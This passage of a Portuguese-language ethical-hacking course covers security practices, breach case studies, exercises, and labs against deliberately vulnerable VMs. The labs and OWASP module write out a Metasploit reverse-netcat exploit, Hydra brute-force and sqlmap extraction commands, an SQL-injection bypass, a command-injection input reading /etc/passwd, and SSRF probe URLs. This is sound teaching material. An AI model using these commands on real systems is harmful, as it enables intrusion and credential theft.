rigorosas, garantindo que apenas usuários autorizados tenham acesso aos
recursos e informações necessários. Isso inclui o uso de autenticação forte (como
autenticação multifator - MFA), gerenciamento de privilégios e segmentação de
rede.
Política de Segurança da Informação (PSI): Desenvolver e aplicar uma PSI clara
e abrangente que defina as regras e diretrizes para o uso de recursos de TI, o
manuseio de dados e o comportamento esperado dos funcionários. A PSI deve
ser comunicada a todos os colaboradores e revisada periodicamente.
Cloud Computing: Utilizar serviços de computação em nuvem de forma segura,
aproveitando os recursos de segurança oferecidos pelos provedores de nuvem e
implementando configurações de segurança adequadas para proteger os dados
e aplicações na nuvem.
Cultura de Segurança da Informação: Promover uma cultura de segurança em
toda a organização, educando os funcionários sobre os riscos cibernéticos e as
melhores práticas de segurança. Treinamentos regulares e campanhas de
conscientização são essenciais para fortalecer o elo humano na cadeia de
segurança.
Gestão de Riscos: Implementar um processo contínuo de gestão de riscos para
identificar, avaliar, tratar e monitorar os riscos de segurança da informação. Isso
permite que as organizações tomem decisões informadas sobre onde alocar
recursos de segurança.
Contratos de Confidencialidade (NDA): Utilizar NDAs com funcionários,
parceiros e fornecedores para proteger informações sensíveis e proprietárias.

Isso estabelece obrigações legais em relação à confidencialidade dos dados.
Gestão de Continuidade de Negócios (GCN) e Plano de Recuperação de
Desastres (PRD): Desenvolver e testar planos para garantir que as operações
críticas possam ser retomadas rapidamente após um incidente de segurança ou
desastre. Isso inclui a identificação de processos críticos, recursos necessários e
procedimentos de recuperação.
Estudos de Caso de Ataques Cibernéticos
Aprender com incidentes reais é uma das formas mais eficazes de entender a
importância da cibersegurança. Abaixo, analisamos alguns dos ataques cibernéticos
mais notáveis da história e as lições que podemos extrair deles [5]:
WannaCry (2017): Este ataque de ransomware global afetou mais de 200.000
computadores em 150 países, criptografando dados e exigindo resgates em
Bitcoin. A principal lição foi a importância crítica de manter os sistemas
operacionais e softwares atualizados com os patches de segurança mais
recentes. Muitas das vítimas do WannaCry estavam usando versões
desatualizadas do Windows que eram vulneráveis à exploração.
Equifax (2017): Uma das maiores violações de dados da história, que expôs
informações sensíveis de cerca de 145 milhões de pessoas. A causa raiz foi uma
vulnerabilidade não corrigida em um aplicativo web. Este caso ressaltou a
necessidade de uma gestão rigorosa de patches, varreduras de vulnerabilidade
contínuas e a proteção de dados pessoais em todas as etapas.
Marriott (2018): Hackers acessaram o banco de dados da rede hoteleira por
quatro anos, comprometendo dados de 500 milhões de hóspedes. A violação foi
atribuída a um ataque persistente e sofisticado. A lição aqui é a importância da
segmentação de rede, monitoramento contínuo de ameaças e a necessidade de
proteger dados sensíveis, mesmo que o acesso inicial seja obtido.
Colonial Pipeline (2021): Um ataque de ransomware que forçou o fechamento
de um dos maiores oleodutos dos EUA, causando escassez de combustível. Este
incidente destacou a vulnerabilidade da infraestrutura crítica e a necessidade de
implementar defesas robustas, incluindo planos de resposta a incidentes e
backups offline, para minimizar o impacto de ataques.

Yahoo (2013 e 2014): Duas grandes violações de dados que afetaram todos os 3
bilhões de usuários registrados, expondo nomes, e-mails, senhas e perguntas de
segurança. A principal lição foi a importância da detecção precoce de violações e
a necessidade de notificar os usuários rapidamente. A demora na descoberta e
divulgação aumentou o impacto e a desconfiança.
Estudos de Caso de Pentest e Ethical Hacking
Os testes de penetração e o hacking ético têm sido cruciais para fortalecer a segurança
de inúmeras organizações. Embora muitos casos específicos sejam confidenciais,
podemos citar exemplos gerais e histórias de hackers éticos que demonstram o valor
dessas práticas:
Programas de Bug Bounty: Muitas empresas, como Google, Microsoft e
Facebook, mantêm programas de bug bounty, onde recompensam hackers
éticos por encontrarem e reportarem vulnerabilidades em seus sistemas. Esses
programas são exemplos de pentests contínuos e colaborativos que ajudam a
identificar e corrigir falhas antes que sejam exploradas por atacantes maliciosos.
Auditorias de Segurança Regulares: Empresas que investem em auditorias de
segurança regulares e pentests proativos conseguem identificar e mitigar
vulnerabilidades antes que se tornem incidentes. Por exemplo, uma instituição
financeira que realiza pentests anuais pode descobrir falhas em seus sistemas de
pagamento online, corrigindo-as antes que um atacante possa explorá-las para
fraude.
Histórias de Hackers Éticos Famosos:
Kevin Mitnick: Embora tenha sido um hacker de chapéu preto no passado,
Mitnick se tornou um consultor de segurança renomado, usando suas
habilidades para ajudar empresas a se protegerem. Sua história demonstra
a transição de um hacker malicioso para um defensor da segurança,
aplicando o conhecimento de como os ataques funcionam para construir
defesas mais fortes.
Charlie Miller e Chris Valasek: Conhecidos por demonstrar como hackear
um carro Jeep Cherokee remotamente, eles expuseram vulnerabilidades
críticas em sistemas automotivos. Seu trabalho levou a recalls de veículos e
melhorias significativas na segurança de carros conectados, mostrando

como o hacking ético pode ter um impacto positivo na segurança de
produtos do mundo real.
Tendências Futuras em Cibersegurança
A paisagem das ameaças cibernéticas está em constante evolução, impulsionada por
avanços tecnológicos e a crescente sofisticação dos atacantes. Algumas das
tendências futuras mais importantes em cibersegurança incluem:
Inteligência Artificial (IA) e Machine Learning (ML) na Cibersegurança: A IA e o
ML estão sendo cada vez mais utilizados para detectar ameaças de forma mais
rápida e precisa, automatizar respostas a incidentes e prever ataques. No
entanto, os atacantes também estão explorando a IA para desenvolver ataques
mais sofisticados, como malware polimórfico e ataques de phishing mais
convincentes.
Segurança da Internet das Coisas (IoT): Com o aumento exponencial de
dispositivos IoT conectados, a segurança desses dispositivos se torna uma
preocupação crescente. Muitos dispositivos IoT são projetados com pouca
segurança, tornando-os alvos fáceis para ataques e botnets. A proteção de
dispositivos IoT será um desafio significativo no futuro.
Segurança da Nuvem: À medida que mais organizações migram para a nuvem, a
segurança da infraestrutura e dos dados na nuvem se torna primordial. A
segurança da nuvem envolve a proteção de dados, aplicações e infraestrutura de
nuvem contra ameaças cibernéticas, exigindo uma abordagem de segurança
compartilhada entre o provedor de nuvem e o cliente.
Ataques à Cadeia de Suprimentos: Atacantes estão cada vez mais visando a
cadeia de suprimentos de software, comprometendo fornecedores para infectar
múltiplos clientes. O ataque à SolarWinds é um exemplo notável. A verificação de
segurança de terceiros e a implementação de práticas de desenvolvimento
seguro serão cruciais.
Ataques Baseados em Identidade: Com o aumento do trabalho remoto e o uso
de serviços baseados em nuvem, a identidade se tornou o novo perímetro de
segurança. Ataques que visam roubar credenciais ou explorar falhas de
autenticação e autorização serão cada vez mais comuns. A implementação de
Zero Trust e autenticação forte será fundamental.

Privacidade de Dados e Regulamentações: A crescente preocupação com a
privacidade de dados levará a mais regulamentações como LGPD e GDPR,
exigindo que as organizações implementem medidas de proteção de dados mais
rigorosas e sejam transparentes sobre como coletam, usam e protegem as
informações pessoais.

Referências
[1] Kaspersky. O que é cibersegurança? Disponível em:
https://www.kaspersky.com.br/resource-center/definitions/what-is-cyber-security

[2] IBM. O que é a cibersegurança? Disponível em: https://www.ibm.com/br-
pt/topics/cybersecurity

[3] IBM. O que é a segurança da informação? Disponível em: https://www.ibm.com/br-
pt/topics/information-security

[4] Check Point Software. Os 8 principais tipos de ciberataque. Disponível em:

https://www.checkpoint.com/pt/cyber-hub/cyber-security/what-is-cyber-
attack/types-of-cyber-attacks/

[5] AIQON Blog. Os 10 Maiores Ataques Cibernéticos da História. Disponível em:
https://aiqon.com.br/blog/maiores-ataques-ciberneticos-historia/
[6] Atlas Governance. Boas práticas de segurança da informação. Disponível em:

https://welcome.atlasgov.com/blog/ciberseguranca/boas-praticas-de-seguranca-da-
informacao/

[7] IBM. O que é Pentest (teste de penetração)? Disponível em:
https://www.ibm.com/br-pt/topics/penetration-testing
[8] Cloudflare. O que é teste de penetração? Disponível em:

https://www.cloudflare.com/pt-br/learning/security/glossary/what-is-penetration-
testing/

[9] OWASP Foundation. Penetration Testing Methodologies. Disponível em:
https://owasp.org/www-project-web-security-testing-guide/latest/3-
The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies

[10] IBM. O que é o Hacking ético? Disponível em: https://www.ibm.com/br-
pt/topics/ethical-hacking

[11] HackerOne. 7 Pentesting Tools You Must Know About. Disponível em:

https://www.hackerone.com/knowledge-center/7-pentesting-tools-you-must-know-
about

Exemplos Práticos e Exercícios
Para solidificar o aprendizado e permitir que os alunos apliquem os conceitos teóricos,
este curso incluirá exemplos práticos e exercícios em cada módulo. Abaixo,
apresentamos uma amostra do tipo de exemplos e exercícios que serão
desenvolvidos.

Módulo 1: Fundamentos da Cibersegurança e Segurança da
Informação
Exemplo Prático: Análise de um E-mail de Phishing
Cenário: Você recebe um e-mail que parece ser do seu banco, solicitando que você
clique em um link para atualizar suas informações de conta devido a uma suposta
atividade suspeita.
Objetivo: Identificar os indicadores de um ataque de phishing.
Passos para Análise:

1. Remetente: Verifique o endereço de e-mail do remetente. Ele corresponde
exatamente ao domínio oficial do banco? E-mails de phishing frequentemente

usam endereços semelhantes, mas não idênticos (ex: banco@servico-
banco.com em vez de banco@banco.com ).

1. Saudação: E-mails legítimos de bancos geralmente se dirigem a você pelo nome.
E-mails de phishing tendem a usar saudações genéricas como “Prezado Cliente”
ou “Caro Usuário”.
2. Conteúdo e Urgência: O e-mail contém erros de gramática ou ortografia? Ele
tenta criar um senso de urgência ou medo (“Sua conta será suspensa se você não
agir agora”)? Essas são táticas comuns de phishing.
3. Links: Passe o mouse sobre os links (NÃO clique!) para ver o URL real para o qual
eles apontam. Ele corresponde ao site oficial do banco? Links de phishing
frequentemente levam a sites falsos que se parecem com o original.
4. Anexos: O e-mail contém anexos inesperados? Anexos maliciosos podem conter
malware.
Conclusão: Ao analisar esses pontos, você pode determinar se o e-mail é uma
tentativa de phishing e evitar ser vítima.
Exercício: Identificação de Vulnerabilidades em um Site Fictício
Cenário: Você é um analista de segurança e recebeu a tarefa de identificar
vulnerabilidades em um site de e-commerce fictício. O site possui uma página de
login, uma página de produtos e um formulário de contato.
Tarefa: Liste pelo menos 3 vulnerabilidades potenciais que você procuraria neste site,
com base nos conceitos de Ameaças Cibernéticas Comuns e Vulnerabilidades Comuns
abordados no Módulo 1. Para cada vulnerabilidade, explique brevemente por que ela
é uma preocupação de segurança.
Exemplo de Resposta Esperada (parcial):
5. Vulnerabilidade: Injeção de SQL na página de login. Preocupação de
Segurança: Se os campos de entrada de usuário e senha não forem devidamente
validados e sanitizados, um atacante pode inserir código SQL malicioso para
bypassar a autenticação ou extrair informações do banco de dados.

Módulo 2: Teste de Penetração (Pentest)
Exemplo Prático: Simulação de Coleta de Inteligência (OSINT)
Cenário: Você está realizando a fase de coleta de inteligência para um pentest em uma
empresa fictícia, a “TechSolutions Ltda.”.
Objetivo: Utilizar técnicas de OSINT para coletar informações públicas sobre a
empresa.
Passos para Simulação:

1. Pesquisa no Google: Pesquise por “TechSolutions Ltda.” e termos relacionados
como “TechSolutions contato”, “TechSolutions funcionários”, “TechSolutions
vagas”. Anote informações como endereços de e-mail, números de telefone,
nomes de funcionários, tecnologias mencionadas em vagas de emprego.
2. Redes Sociais (LinkedIn): Procure a página da empresa no LinkedIn e perfis de
funcionários. Observe cargos, tecnologias listadas em perfis, conexões, etc.
3. Registros WHOIS: Use um serviço WHOIS online (ex: whois.com ) para pesquisar
o domínio techsolutions.com.br (fictício). Anote informações como nome do
registrante, contatos administrativos e técnicos, datas de registro e expiração.
4. Google Dorking: Use operadores de busca avançados do Google (dorks) para
encontrar informações específicas. Exemplos:
site:techsolutions.com.br filetype:pdf (para encontrar documentos
PDF no site)
site:techsolutions.com.br intitle:"index of" (para encontrar
diretórios abertos)

Conclusão: A coleta de inteligência é crucial para entender o alvo e identificar
potenciais vetores de ataque. Mesmo informações aparentemente inofensivas podem
ser valiosas para um atacante.
Exercício: Mapeamento de Fases do Pentest
Cenário: Um pentester está realizando as seguintes ações:
a) Negociando os termos do engajamento com o cliente.
b) Usando o Nmap para identificar portas abertas em um servidor.
c) Tentando explorar uma vulnerabilidade de SQL Injection que foi encontrada.
d) Escrevendo um relatório detalhado com as vulnerabilidades e
recomendações.
e) Buscando informações sobre a empresa em redes sociais e sites públicos.
f) Analisando o código-fonte de uma aplicação web para encontrar falhas.
Tarefa: Para cada ação (a-f), identifique a fase do Pentest (PTES) a que ela pertence.

Módulo 3: Ethical Hacking: Ferramentas e Técnicas
Exemplo Prático: Uso Básico do Nmap para Varredura de Portas
Cenário: Você deseja verificar quais portas estão abertas em um servidor local (ou em
uma máquina virtual de laboratório com permissão, como um Metasploitable).
Objetivo: Realizar uma varredura de portas básica usando o Nmap.
Ferramenta: Nmap (disponível no Kali Linux)
Comando:

nmap [endereço_IP_do_alvo]

Exemplo: Se o endereço IP do seu alvo for 192.168.1.100 :

nmap 192.168.1.100

Análise da Saída: O Nmap listará as portas abertas, o serviço associado a cada porta
e, em alguns casos, a versão do serviço. Isso pode revelar serviços desnecessários ou
desatualizados que podem ser vulneráveis.
Exercício: Identificação de Ferramentas para Cenários Específicos
Cenário: Para cada um dos seguintes cenários, qual ferramenta de Ethical Hacking
(mencionada no Módulo 3) seria a mais apropriada para a tarefa?

1. Cenário: Você precisa analisar o tráfego de rede para identificar credenciais não
criptografadas. Ferramenta: Wireshark
2. Cenário: Você deseja automatizar a exploração de uma vulnerabilidade
conhecida em um sistema. Ferramenta: Metasploit Framework
3. Cenário: Você precisa testar a força das senhas de usuários em um sistema
Linux. Ferramenta: John the Ripper ou Hashcat
4. Cenário: Você está testando a segurança de uma aplicação web e precisa
interceptar e modificar requisições HTTP. Ferramenta: Burp Suite ou OWASP ZAP

Módulo 4: Melhores Práticas e Estudos de Caso
Exemplo Prático: Criação de uma Política de Senhas Seguras
Cenário: Você é o responsável pela segurança da informação em uma pequena
empresa e precisa criar uma política de senhas para os funcionários.
Objetivo: Desenvolver uma política de senhas que incorpore as melhores práticas de
segurança.
Elementos da Política (Exemplo):
Comprimento Mínimo: Senhas devem ter no mínimo 12 caracteres.
Complexidade: Devem conter uma combinação de letras maiúsculas e
minúsculas, números e caracteres especiais.
Reutilização: Proibido reutilizar senhas antigas ou usar a mesma senha em
múltiplos serviços.
Armazenamento: Recomendar o uso de gerenciadores de senhas seguros.
Autenticação Multifator (MFA): Exigir MFA para acesso a sistemas críticos.
Treinamento: Conscientizar os funcionários sobre a importância de senhas
fortes e como criá-las.
Exercício: Análise de um Estudo de Caso de Violação de Dados
Cenário: Leia o resumo do ataque WannaCry (Módulo 4, Estudos de Caso de Ataques
Cibernéticos).
Tarefa: Com base no que você aprendeu sobre as melhores práticas de segurança da
informação, liste pelo menos 3 medidas que poderiam ter ajudado a prevenir ou
mitigar o impacto do ataque WannaCry. Explique como cada medida seria eficaz.
Exemplo de Resposta Esperada (parcial):

1. Medida: Manter sistemas operacionais e softwares atualizados. Eficácia: O
WannaCry explorou uma vulnerabilidade conhecida no Windows para a qual a
Microsoft já havia lançado um patch. Se os sistemas tivessem sido atualizados, a
vulnerabilidade não estaria presente, prevenindo a infecção.

Laboratórios Práticos
Para complementar a teoria e os exemplos práticos, este curso incluirá laboratórios
práticos que permitirão aos alunos configurar ambientes simulados para realizar
ataques e defesas. Esses laboratórios são essenciais para desenvolver habilidades
técnicas e compreender a dinâmica da cibersegurança na prática. Abaixo, detalhamos
a estrutura e os objetivos de alguns laboratórios propostos.
Requisitos para os Laboratórios:
Para a realização dos laboratórios, os alunos precisarão de um ambiente de
virtualização (como VMware Workstation Player, VirtualBox ou Hyper-V) e as seguintes
máquinas virtuais:
Kali Linux: Uma distribuição Linux focada em testes de penetração e auditoria
de segurança, que vem com uma vasta gama de ferramentas pré-instaladas.
Metasploitable 2 ou 3: Uma máquina virtual intencionalmente vulnerável,
projetada para ser um alvo seguro para testes de penetração e exploração de
vulnerabilidades.
Máquina Virtual Windows (ex: Windows 7, 10 ou Server): Para simular
ambientes de usuário ou servidor Windows e testar ataques e defesas específicos
para este sistema operacional.

Módulo 1: Fundamentos da Cibersegurança e Segurança da
Informação
Laboratório 1.1: Configuração de Ambiente Seguro e Uso de Ferramentas Básicas
Objetivo: Familiarizar-se com o ambiente de virtualização e ferramentas básicas de
segurança.
Cenário: Configurar uma máquina virtual Kali Linux e uma máquina virtual
Metasploitable, e realizar algumas operações básicas para verificar a conectividade e a
funcionalidade das ferramentas.
Passos:

1. Instalação do VirtualBox/VMware: Instalar o software de virtualização no
sistema host.
2. Download e Importação de VMs: Baixar as imagens ISO ou arquivos OVA do Kali
Linux e Metasploitable e importá-los para o ambiente de virtualização.
3. Configuração de Rede: Configurar as máquinas virtuais para que possam se
comunicar entre si (rede interna/host-only) e, opcionalmente, com a internet
(NAT).
4. Verificação de Conectividade: No Kali Linux, usar comandos como ping para
verificar a conectividade com a Metasploitable.
5. Exploração Básica do Kali Linux: Navegar pelo sistema de arquivos, abrir um
terminal, e executar comandos básicos como ls , cd , pwd .
6. Uso Básico do Nmap: Realizar uma varredura de portas na Metasploitable a
partir do Kali Linux para identificar serviços abertos. Ex: nmap -sV
[IP_Metasploitable] .
Laboratório 1.2: Análise de Tráfego de Rede com Wireshark
Objetivo: Capturar e analisar pacotes de rede para entender o fluxo de dados e
identificar informações sensíveis.
Cenário: Simular uma comunicação entre duas máquinas virtuais e usar o Wireshark
para interceptar e analisar o tráfego.
Passos:
7. Configuração: Certificar-se de que o Kali Linux e a Metasploitable estão na
mesma rede virtual.
8. Iniciar Captura: No Kali Linux, abrir o Wireshark e selecionar a interface de rede
correta para iniciar a captura de pacotes.
9. Gerar Tráfego: Na Metasploitable, realizar alguma atividade que gere tráfego de
rede (ex: acessar um site HTTP, fazer um login FTP).
10. Analisar Pacotes: No Wireshark, aplicar filtros para buscar informações
específicas (ex: http , ftp , password ). Identificar credenciais em texto claro (se
houver) ou outros dados sensíveis.
11. Interpretação: Discutir como a análise de tráfego pode revelar vulnerabilidades
e a importância da criptografia.

Módulo 2: Teste de Penetração (Pentest)
Laboratório 2.1: Reconhecimento e Enumeração com Nmap e Enum4linux
Objetivo: Praticar técnicas de reconhecimento e enumeração para coletar
informações detalhadas sobre um alvo.
Cenário: Usar Nmap e Enum4linux para identificar hosts ativos, portas abertas,
serviços, versões de software e informações de usuários/grupos em uma máquina
Windows ou Metasploitable.
Passos:

1. Varredura Abrangente com Nmap: No Kali Linux, usar o Nmap para uma
varredura mais detalhada na Metasploitable ou na VM Windows. Ex: nmap -A -p-
[IP_Alvo] (varredura de todas as portas com detecção de OS e versão de
serviço).
2. Enumeração SMB/NetBIOS com Enum4linux: Se o alvo for Windows ou
Metasploitable, usar o enum4linux para enumerar usuários, grupos,
compartilhamentos e outras informações via SMB/NetBIOS. Ex: enum4linux -a
[IP_Alvo] .
3. Análise de Resultados: Interpretar a saída das ferramentas para identificar
potenciais vetores de ataque, como serviços desatualizados, compartilhamentos
abertos ou nomes de usuários válidos.
Laboratório 2.2: Exploração de Vulnerabilidades com Metasploit Framework
Objetivo: Aprender a usar o Metasploit Framework para explorar vulnerabilidades
conhecidas e obter acesso a um sistema alvo.
Cenário: Escolher uma vulnerabilidade conhecida na Metasploitable (ex:
vsftpd_234_backdoor , apache_mod_cgi_bash_env_exec ) e usar o Metasploit para
explorá-la e obter uma shell no sistema alvo.
Passos:
4. Iniciar Metasploit: No Kali Linux, iniciar o console do Metasploit ( msfconsole ).
5. Pesquisar Exploit: Pesquisar por exploits relevantes para os serviços
identificados na Metasploitable. Ex: search vsftpd .
6. Selecionar Exploit e Payload: Usar o comando use
exploit/unix/ftp/vsftpd_234_backdoor e set payload
cmd/unix/reverse_netcat .
7. Configurar Opções: Definir as opções necessárias para o exploit e payload (ex:
set RHOSTS [IP_Metasploitable] , set LHOST [IP_Kali] ).
8. Executar Exploit: Executar o exploit com o comando run ou exploit .
9. Pós-Exploração Básica: Uma vez que a shell é obtida, executar comandos
básicos no alvo (ex: whoami , ls -la ) para confirmar o acesso.

Módulo 3: Ethical Hacking: Ferramentas e Técnicas
Laboratório 3.1: Ataque de Força Bruta a Serviços Web com Hydra
Objetivo: Realizar um ataque de força bruta contra um serviço web (ex: login FTP ou
SSH) usando a ferramenta Hydra.
Cenário: Tentar adivinhar credenciais de login de um serviço na Metasploitable
usando um dicionário de senhas.
Passos:

1. Preparar Dicionário: Criar um arquivo de texto com uma lista de nomes de
usuário e senhas comuns (ou usar um dicionário pré-existente no Kali Linux).
2. Executar Hydra: No Kali Linux, usar o Hydra para atacar o serviço. Ex: hydra -L
users.txt -P passwords.txt ftp://[IP_Metasploitable] ou hydra -L
users.txt -P passwords.txt ssh://[IP_Metasploitable] .
3. Analisar Resultados: Observar se o Hydra consegue encontrar credenciais
válidas e discutir a importância de senhas fortes e bloqueio de contas.
Laboratório 3.2: Injeção de SQL Básica com sqlmap
Objetivo: Demonstrar a exploração de uma vulnerabilidade de injeção de SQL usando
o sqlmap.
Cenário: Identificar e explorar uma vulnerabilidade de injeção de SQL em uma
aplicação web vulnerável (ex: DVWA - Damn Vulnerable Web Application, instalada em
uma VM).

Passos:

1. Configurar DVWA: Instalar e configurar o DVWA em uma máquina virtual (ex:
Metasploitable ou uma VM Linux separada com Apache/MySQL).
2. Identificar Ponto Vulnerável: Acessar a aplicação web DVWA e identificar um
parâmetro de URL ou campo de formulário que possa ser vulnerável a SQL
Injection.
3. Executar sqlmap: No Kali Linux, usar o sqlmap para testar e explorar a
vulnerabilidade. Ex: sqlmap -u "http://[IP_DVWA]/vulnerabilities/sqli/?
id=1&Submit=Submit#" --dbs (para listar bancos de dados).
4. Extrair Dados: Continuar usando o sqlmap para extrair tabelas, colunas e dados
do banco de dados. Ex: sqlmap -u "URL_Vulnerável" -D [nome_do_banco] --
tables .
5. Discussão: Analisar o impacto da injeção de SQL e as medidas de proteção
(sanitização de entrada, prepared statements).
Módulo 4: Melhores Práticas e Estudos de Caso
Laboratório 4.1: Implementação de Políticas de Senha e MFA
Objetivo: Configurar e testar a eficácia de políticas de senha fortes e autenticação
multifator.
Cenário: Em uma máquina virtual Windows Server ou Linux, configurar políticas de
senha que exijam complexidade, comprimento mínimo e histórico de senhas.
Opcionalmente, integrar um sistema de MFA (ex: Google Authenticator para SSH ou
um serviço de MFA para login em aplicações).
Passos:
6. Configuração de Políticas de Senha: No Windows Server, usar a Política de
Grupo para definir requisitos de senha. No Linux, editar arquivos como
/etc/pam.d/common-password .
7. Teste de Senhas Fracas: Tentar criar senhas que não atendam aos requisitos
para verificar se a política está funcionando.
8. Configuração de MFA (Opcional): Instalar e configurar um módulo PAM para
Google Authenticator no Linux para SSH, ou configurar MFA em uma aplicação

web de teste.
4. Teste de MFA: Tentar logar com e sem o segundo fator para entender a proteção
adicional.
Laboratório 4.2: Configuração Básica de Firewall e IPS/IDS
Objetivo: Entender como firewalls e sistemas de detecção/prevenção de intrusões
(IDS/IPS) podem proteger uma rede.
Cenário: Configurar regras básicas de firewall (ex: iptables no Linux ou firewall do
Windows) para bloquear tráfego indesejado. Opcionalmente, instalar e configurar um
IDS/IPS simples (ex: Snort) para detectar atividades maliciosas.
Passos:

1. Configuração de Firewall: Em uma VM Linux, usar iptables para bloquear
portas específicas (ex: porta 23 - Telnet) ou IPs. No Windows, configurar regras de
entrada/saída no Firewall do Windows.
2. Teste de Bloqueio: Do Kali Linux, tentar acessar a porta bloqueada na VM alvo
para verificar se o firewall está funcionando.
3. Instalação e Configuração do Snort (Opcional): Instalar o Snort em uma VM
Linux e configurar regras básicas para detectar varreduras de porta ou tentativas
de login falhas.
4. Geração de Alertas: Gerar tráfego malicioso (ex: varredura de porta) do Kali
Linux e verificar se o Snort gera alertas correspondentes.
Esses laboratórios práticos fornecerão uma experiência valiosa, permitindo que os
alunos apliquem os conhecimentos teóricos em um ambiente controlado e seguro,
desenvolvendo as habilidades necessárias para atuar na área de cibersegurança.

Módulo 5: Exploração de Vulnerabilidades na Prática

Visão Geral
Este módulo aprofunda-se nas técnicas de exploração de vulnerabilidades,
fornecendo exemplos práticos e detalhados de como atacantes podem comprometer
sistemas através de falhas comuns. Abordaremos as vulnerabilidades mais críticas

identificadas pela OWASP (Open Web Application Security Project) e demonstraremos
os métodos de exploração para cada uma, com foco em SQL Injection, Cross-Site
Scripting (XSS), Broken Access Control, Server-Side Request Forgery (SSRF) e Remote
Code Execution (RCE). O objetivo é capacitar os alunos a entender a mecânica por trás
desses ataques, a fim de desenvolver defesas mais eficazes.

Tópicos:

1. Injection (Injeção) - A03:2021
A injeção ocorre quando dados não confiáveis são enviados a um interpretador como
parte de um comando ou consulta. Isso pode levar à execução de comandos não
intencionais ou ao acesso não autorizado a dados. As vulnerabilidades de injeção são
frequentemente encontradas em aplicações web que interagem com bancos de
dados, sistemas operacionais ou diretórios.
SQL Injection (SQLi)
Descrição: SQL Injection é uma técnica de ataque que explora vulnerabilidades em
aplicações web que interagem com bancos de dados SQL. Um atacante insere código
SQL malicioso em campos de entrada (como formulários de login ou parâmetros de
URL), fazendo com que o banco de dados execute comandos não intencionais. Isso
pode resultar em acesso não autorizado a dados sensíveis, modificação ou exclusão
de registros, ou até mesmo controle total sobre o servidor de banco de dados [12].
Cenário de Exploração: Considere uma aplicação web que usa a entrada do usuário
para construir uma consulta SQL sem validação ou sanitização adequada. Por
exemplo, uma página de login pode ter uma consulta como:

SELECT * FROM users WHERE username = '[username_input]' AND password =
'[password_input]';

Um atacante pode inserir ' OR '1'='1 no campo username_input . A consulta
resultante se tornaria:

SELECT * FROM users WHERE username = '' OR '1'='1' AND password =
'[password_input]';

Como '1'='1 é sempre verdadeiro, a condição username = '' OR '1'='1 também
será verdadeira, permitindo que o atacante faça login sem credenciais válidas. Outros
exemplos de exploração incluem:
Extração de Dados: Usando UNION SELECT para combinar a consulta original
com uma consulta que extrai dados de outras tabelas.
Injeção Baseada em Erro: Forçando o banco de dados a retornar mensagens de
erro que revelam informações sobre a estrutura do banco de dados.
Injeção Baseada em Tempo (Blind SQLi): Usando funções de atraso (ex:
SLEEP(10) ) para inferir informações do banco de dados com base no tempo de
resposta do servidor, quando não há saída direta.
Ferramentas Comuns: sqlmap , Burp Suite (Intruder).
OS Command Injection (Injeção de Comando do Sistema Operacional)
Descrição: A injeção de comando do sistema operacional ocorre quando uma
aplicação executa comandos do sistema operacional com base em entrada fornecida
pelo usuário, sem validação ou sanitização adequada. Um atacante pode injetar
comandos adicionais que serão executados pelo sistema operacional subjacente [12].
Cenário de Exploração: Considere uma aplicação web que permite ao usuário
“pingar” um endereço IP para verificar a conectividade. O comando executado no
servidor pode ser algo como:

ping -c 4 [ip_address_input]

Se um atacante inserir 127.0.0.1; cat /etc/passwd no campo ip_address_input ,
o comando resultante no servidor seria:

ping -c 4 127.0.0.1; cat /etc/passwd

Isso faria com que o servidor não apenas pingasse o endereço, mas também
executasse o comando cat /etc/passwd , revelando o conteúdo do arquivo de
senhas do sistema. Outros caracteres comuns para encadear comandos incluem & ,
&& , | , || .

Ferramentas Comuns: Burp Suite (Repeater), netcat.
2. Broken Access Control (Controle de Acesso Quebrado) - A01:2021
O controle de acesso impõe políticas de forma que os usuários não possam agir fora
de suas permissões pretendidas. Falhas no controle de acesso geralmente levam à
divulgação não autorizada de informações, modificação ou destruição de dados, ou à
execução de funções de negócios fora dos limites do usuário [13].
Insecure Direct Object Reference (IDOR)
Descrição: IDOR ocorre quando uma aplicação expõe uma referência direta a um
objeto de implementação interna (como um arquivo, diretório, registro de banco de
dados ou chave) e não verifica se o usuário tem autorização para acessar esse objeto.
Um atacante pode manipular essas referências para acessar recursos que não deveria
[13].
Cenário de Exploração: Imagine uma aplicação bancária onde um usuário pode
visualizar seu extrato de conta através de uma URL como
https://banco.com/extrato?id_conta=12345 . Se um atacante alterar o parâmetro
id_conta para 12346 e o sistema não verificar se o atacante é o proprietário da conta
12346 , ele poderá visualizar o extrato de outra pessoa.
Exemplo:
URL original: https://loja.com/meus_pedidos?pedido_id=USER_12345
URL manipulada: https://loja.com/meus_pedidos?pedido_id=USER_12346
Se a aplicação não validar a propriedade do pedido_id , o atacante poderá visualizar
os pedidos de outro usuário.
Ferramentas Comuns: Proxy web (Burp Suite, OWASP ZAP) para interceptar e
modificar requisições.
Forced Browsing (Navegação Forçada)
Descrição: A navegação forçada ocorre quando um atacante consegue acessar
páginas ou funcionalidades que deveriam ser restritas, simplesmente digitando a URL
diretamente no navegador ou manipulando parâmetros. Isso geralmente acontece
quando a aplicação não implementa verificações de autorização adequadas em todas
as páginas e funcionalidades [13].

Cenário de Exploração: Uma aplicação web pode ter uma área administrativa em
https://aplicacao.com/admin que só deve ser acessível por administradores
logados. Se um usuário comum tentar acessar essa URL diretamente e a aplicação não
verificar suas permissões, ele poderá ter acesso indevido a funcionalidades
administrativas.
Exemplo:
Página de usuário comum: https://aplicacao.com/dashboard
Tentativa de acesso direto à página administrativa:
https://aplicacao.com/admin/gerenciar_usuarios
Se a aplicação falhar em verificar a função do usuário, o atacante pode ter acesso a
funcionalidades privilegiadas.
Ferramentas Comuns: Navegador web, proxy web.
3. Server-Side Request Forgery (SSRF) - A10:2021
Descrição: SSRF é uma vulnerabilidade que permite a um atacante fazer com que o
servidor de uma aplicação web faça requisições HTTP para um destino arbitrário. Isso
ocorre quando a aplicação busca um recurso remoto sem validar a URL fornecida pelo
usuário. Um atacante pode usar o servidor como um proxy para atacar sistemas
internos que não são acessíveis diretamente da internet, ou para acessar metadados
de serviços em nuvem [14].
Cenário de Exploração: Uma aplicação pode ter uma funcionalidade que permite ao
usuário fornecer uma URL para que o servidor baixe uma imagem ou um arquivo. Se a
aplicação não validar a URL, um atacante pode fornecer uma URL interna ou um
endereço IP local.
Exemplos de Exploração:
Port Scan Interno: Um atacante pode usar a funcionalidade de SSRF para
escanear portas em servidores internos da rede da vítima. Por exemplo,
fornecendo URLs como http://192.168.1.1:80 , http://192.168.1.1:22 , etc.,
e observando o tempo de resposta ou mensagens de erro para determinar quais
portas estão abertas ou fechadas.

Acesso a Metadados de Serviços em Nuvem: Em ambientes de nuvem (AWS,
